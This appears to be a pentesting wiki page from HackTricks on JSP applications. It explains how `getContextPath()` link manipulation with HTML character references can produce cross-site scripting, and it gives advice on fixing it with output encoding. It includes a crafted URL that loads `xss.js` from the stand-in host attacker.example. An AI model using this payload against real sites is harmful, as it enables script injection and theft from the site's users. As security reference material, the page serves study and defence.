---
title: "JSP"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/jsp.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## `getContextPath()` Link Manipulation

`getContextPath()` Link Manipulation
Some JSP applications prepend `request.getContextPath()` to relative resource URLs in attributes such as `src`, `href`, or `action`. If a servlet container incorporates attacker-controlled path parameters into that value and the template does not apply HTML-attribute encoding, HTML character references can transform the rendered value into a protocol-relative URL on an attacker-controlled host.[\[1\]](#references)

```
http://127.0.0.1:8080//attacker.example/xss.js#/..;/..;/contextPathExample/test.jsp
```
In an affected page, the browser decodes `/` as `/` and `#` as `#`. A generated resource URL can therefore begin with `//attacker.example/xss.js`, while the fragment hides the remaining path. If this value reaches a `<script src>` attribute, the page loads attacker-controlled JavaScript and the issue becomes XSS; other resource attributes may enable related content injection.[\[1\]](#references)

Apply context-appropriate output encoding to dynamic values placed in HTML attributes. For a URL embedded in an attribute, OWASP recommends URL encoding followed by HTML-attribute encoding; using a fixed, trusted resource base also avoids deriving an origin from request-controlled path data.[\[2\]](#references)

## References
